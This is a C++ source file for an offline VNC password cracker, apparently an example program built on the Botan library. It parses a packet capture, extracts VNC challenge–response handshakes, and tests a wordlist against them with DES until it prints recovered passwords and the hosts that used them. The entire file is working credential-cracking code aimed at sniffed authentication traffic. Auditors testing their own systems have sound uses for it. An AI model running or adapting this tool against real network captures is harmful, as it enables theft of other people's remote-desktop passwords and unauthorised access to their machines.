/*
  (C) 2008 Jack Lloyd <lloyd@randombit.net>
*/
#include <cctype>
#include <exception>
#include <fstream>
#include <iosfwd>
#include <iostream>
#include <sstream>
#include <stdexcept>
#include <string>
#include <string>
#include <vector>

#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#include <pcap.h>

#include <botan/botan.h>
#include <botan/des.h>

class ChallengeResponses
   {
   public:
      int count() const { return solutions.size(); }
      bool all_solved() const;

      void add(const std::string& challenge, const std::string& response,
               const std::string& to, const std::string& from)
         {
         solutions[std::make_pair(challenge, response)] = "";
         challenge_to_id[challenge] = "from " + from + " to " + to;
         }

      void test(const std::string&);
   private:
      std::map<std::string, std::string> challenge_to_id;
      std::map<std::pair<std::string, std::string>, std::string> solutions;
   };

class Packet_Reader
   {
   public:
      Packet_Reader(const std::string& filename);
      ~Packet_Reader();

      bool kick();

      std::string payload() const { return payload_str; }
      std::string destination_address() const { return dest_addr_str; }
      std::string source_address() const { return src_addr_str; }

   private:
      char pcap_errbuf[PCAP_ERRBUF_SIZE];
      pcap_t* pcap_handle;

      std::string payload_str, dest_addr_str, src_addr_str;
   };

Packet_Reader::Packet_Reader(const std::string& filename)
   {
   pcap_handle = pcap_open_offline(filename.c_str(), pcap_errbuf);

   if(!pcap_handle)
      throw std::runtime_error("Could not read pcap file " + std::string(pcap_errbuf));
   }

Packet_Reader::~Packet_Reader()
   {
   if(pcap_handle)
      {
      pcap_close(pcap_handle);
      pcap_handle = 0;
      }
   }

bool Packet_Reader::kick()
   {
   pcap_pkthdr header;

   payload_str = dest_addr_str = src_addr_str = ""; // reset

   while(const u_char* packet = pcap_next(pcap_handle, &header))
      {
      if(header.len < sizeof(struct ether_header))
         continue;

      const struct ether_header* eptr = reinterpret_cast<const struct ether_header*>(packet);

      if(ntohs(eptr->ether_type) != ETHERTYPE_IP)
         continue;

      if(header.len < sizeof(struct ether_header) + sizeof(struct ip))
         continue;

      const struct ip* ip_header = reinterpret_cast<const struct ip*>(packet + sizeof(ether_header));

      size_t size_ip = 4 * ip_header->ip_hl;
      if(size_ip < 20)
         continue; // bogus IP header

      if(header.len < sizeof(struct ether_header) + size_ip + sizeof(tcphdr))
         continue;

      const struct tcphdr* tcp = reinterpret_cast<const struct tcphdr*>(packet + sizeof(ether_header) + size_ip);

      size_t size_tcp = tcp->doff * 4;

      if(size_tcp < 20)
         continue; // bongus TCP header

      const u_char* payload_buf = packet + sizeof(ether_header) + size_ip + size_tcp;
      const size_t payload_len = header.len - (sizeof(ether_header) + size_ip + size_tcp);

      payload_str = std::string(reinterpret_cast<const char*>(payload_buf), payload_len);

      std::ostringstream os1;
      os1 << inet_ntoa(ip_header->ip_src) << ':' << ntohs(tcp->source);
      src_addr_str = os1.str();

      std::ostringstream os2;
      os2 << inet_ntoa(ip_header->ip_dst) << ':' << ntohs(tcp->dest);
      dest_addr_str = os2.str();

      return true;  // sucessfully got a TCP packet of some kind (yay)
      }

   return false; // all out of bits
   }

class VNC_Auth_Reader
   {
   public:
      VNC_Auth_Reader(const std::string& filename) : reader(filename) {}

      bool find_next(std::string& destination_address_out,
                     std::string& source_address_out,
                     std::string& challenge_out,
                     std::string& response_out);

   private:
      Packet_Reader reader;
   };

bool VNC_Auth_Reader::find_next(std::string& destination_address_out,
                                std::string& source_address_out,
                                std::string& challenge_out,
                                std::string& response_out)
   {
   while(reader.kick())
      {
      const std::string payload = reader.payload();

      // This could be a lot smarter. It would be nice in particular
      // to handle malformed streams and concurrent handshakes.
      if(payload.find("VNCAUTH_") != std::string::npos)
         {
         const std::string from = reader.source_address();
         const std::string to = reader.destination_address();

         std::string challenge, response;

#if 0
         printf("Saw VNCAUTH_ from %s to %s, searching...\n", from.c_str(), to.c_str());
#endif

         while(reader.kick()) // find the challene
            {
#if 0
            printf("Found new packet len %d from %s to %s\n",
                   reader.payload().length(),
                   reader.source_address().c_str(),
                   reader.destination_address().c_str());
#endif

            if(from == reader.source_address() &&
               to == reader.destination_address() &&
               reader.payload().size() == 16)
               {
               challenge = reader.payload();
               break;
               }
            }

         while(reader.kick()) // now find response
            {
#if 0
            printf("Found new packet len %d from %s to %s\n",
                   reader.payload().length(),
                   reader.source_address().c_str(),
                   reader.destination_address().c_str());
#endif

            if(to == reader.source_address() &&
               from == reader.destination_address() &&
               reader.payload().size() == 16)
               {
               response = reader.payload();
               break;
               }
            }

         if(challenge != "" && response != "")
            {
            challenge_out = challenge;
            response_out = response;
            destination_address_out = to;
            source_address_out = from;
            return true;
            }
         }
      }

   return false; // out of gas
   }

void ChallengeResponses::test(const std::string& password)
   {
   static const unsigned char bit_flip[256] = {
      0x00, 0x80, 0x40, 0xC0, 0x20, 0xA0, 0x60, 0xE0, 0x10, 0x90, 0x50, 0xD0,
      0x30, 0xB0, 0x70, 0xF0, 0x08, 0x88, 0x48, 0xC8, 0x28, 0xA8, 0x68, 0xE8,
      0x18, 0x98, 0x58, 0xD8, 0x38, 0xB8, 0x78, 0xF8, 0x04, 0x84, 0x44, 0xC4,
      0x24, 0xA4, 0x64, 0xE4, 0x14, 0x94, 0x54, 0xD4, 0x34, 0xB4, 0x74, 0xF4,
      0x0C, 0x8C, 0x4C, 0xCC, 0x2C, 0xAC, 0x6C, 0xEC, 0x1C, 0x9C, 0x5C, 0xDC,
      0x3C, 0xBC, 0x7C, 0xFC, 0x02, 0x82, 0x42, 0xC2, 0x22, 0xA2, 0x62, 0xE2,
      0x12, 0x92, 0x52, 0xD2, 0x32, 0xB2, 0x72, 0xF2, 0x0A, 0x8A, 0x4A, 0xCA,
      0x2A, 0xAA, 0x6A, 0xEA, 0x1A, 0x9A, 0x5A, 0xDA, 0x3A, 0xBA, 0x7A, 0xFA,
      0x06, 0x86, 0x46, 0xC6, 0x26, 0xA6, 0x66, 0xE6, 0x16, 0x96, 0x56, 0xD6,
      0x36, 0xB6, 0x76, 0xF6, 0x0E, 0x8E, 0x4E, 0xCE, 0x2E, 0xAE, 0x6E, 0xEE,
      0x1E, 0x9E, 0x5E, 0xDE, 0x3E, 0xBE, 0x7E, 0xFE, 0x01, 0x81, 0x41, 0xC1,
      0x21, 0xA1, 0x61, 0xE1, 0x11, 0x91, 0x51, 0xD1, 0x31, 0xB1, 0x71, 0xF1,
      0x09, 0x89, 0x49, 0xC9, 0x29, 0xA9, 0x69, 0xE9, 0x19, 0x99, 0x59, 0xD9,
      0x39, 0xB9, 0x79, 0xF9, 0x05, 0x85, 0x45, 0xC5, 0x25, 0xA5, 0x65, 0xE5,
      0x15, 0x95, 0x55, 0xD5, 0x35, 0xB5, 0x75, 0xF5, 0x0D, 0x8D, 0x4D, 0xCD,
      0x2D, 0xAD, 0x6D, 0xED, 0x1D, 0x9D, 0x5D, 0xDD, 0x3D, 0xBD, 0x7D, 0xFD,
      0x03, 0x83, 0x43, 0xC3, 0x23, 0xA3, 0x63, 0xE3, 0x13, 0x93, 0x53, 0xD3,
      0x33, 0xB3, 0x73, 0xF3, 0x0B, 0x8B, 0x4B, 0xCB, 0x2B, 0xAB, 0x6B, 0xEB,
      0x1B, 0x9B, 0x5B, 0xDB, 0x3B, 0xBB, 0x7B, 0xFB, 0x07, 0x87, 0x47, 0xC7,
      0x27, 0xA7, 0x67, 0xE7, 0x17, 0x97, 0x57, 0xD7, 0x37, 0xB7, 0x77, 0xF7,
      0x0F, 0x8F, 0x4F, 0xCF, 0x2F, 0xAF, 0x6F, 0xEF, 0x1F, 0x9F, 0x5F, 0xDF,
      0x3F, 0xBF, 0x7F, 0xFF };

   unsigned char pass_buf[8] = { 0 };
   for(std::size_t j = 0; j != password.length() && j != 8; j++)
      pass_buf[j] = bit_flip[(unsigned char)password[j]];

   Botan::DES des;
   des.set_key(pass_buf, sizeof(pass_buf));

   // for(auto i : unsolved)
   for(std::map<std::pair<std::string, std::string>, std::string>::iterator i = solutions.begin();
       i != solutions.end(); ++i)
      {
      if(!i->second.empty())
         continue; // already solved

      const std::string challenge = i->first.first;
      const std::string response = i->first.second;

      unsigned char encrypted_challenge[16] = { 0 };
      des.encrypt((const Botan::byte*)&challenge[0], &encrypted_challenge[0]);

      if(std::memcmp(encrypted_challenge, &response[0], 8) == 0)
         {
         des.encrypt((const Botan::byte*)&challenge[8], &encrypted_challenge[8]);

         if(std::memcmp(encrypted_challenge, &response[0], 16) == 0)
            {
            std::cout << "Solved: Password '" << password << "' used "
                      << challenge_to_id[challenge] << "\n";
            i->second = password;
            }
         }
      }
   }

bool ChallengeResponses::all_solved() const
   {
   for(std::map<std::pair<std::string, std::string>, std::string>::const_iterator i = solutions.begin();
       i != solutions.end(); ++i)
      {
      if(i->second.empty())
         return false; // at least one unsolved
      }

   return true;
   }

class Wordlist
   {
   public:
      bool has_more() const;
      std::string next();

      Wordlist(std::istream& i) : in(i) {}
   private:
      std::string next_line();

      std::istream& in;
      std::string last;
   };

bool Wordlist::has_more() const
   {
   return in.good() && !in.eof();
   }

std::string Wordlist::next_line()
   {
   if(!has_more())
      return "";

   std::string next;
   std::getline(in, next);

   if(next.length() > 8)
      next = next.substr(0, 8); /* truncate to 8 chars, VNC's limit */
   return next;
   }

std::string Wordlist::next()
   {
   std::string line = next_line();

   while(line == last)
      line = next_line();

   return (last = line);
   }

int main(int argc, char* argv[])
   {
   try
      {
      if(argc != 3)
         {
         std::cerr << "Usage: " << argv[0] << " <pcapfile> <wordlist>\n";
         return 1;
         }

      Botan::LibraryInitializer init;

      VNC_Auth_Reader read(argv[1]);
      ChallengeResponses crs;

      std::string to, from, challenge, response;
      while(read.find_next(to, from, challenge, response))
         {
         crs.add(challenge, response, to, from);
         }

      std::string wordlist_file = argv[2];

      if(wordlist_file == "-")
         {
         Wordlist wordlist(std::cin);
         while(wordlist.has_more() && !crs.all_solved())
            crs.test(wordlist.next());
         }
      else
         {
         std::ifstream in(wordlist_file.c_str());
         Wordlist wordlist(in);
         while(wordlist.has_more() && !crs.all_solved())
            crs.test(wordlist.next());
         }
      }
   catch(std::exception& e)
      {
      std::cout << e.what() << std::endl;
      return 1;
      }

   return 0;
   }
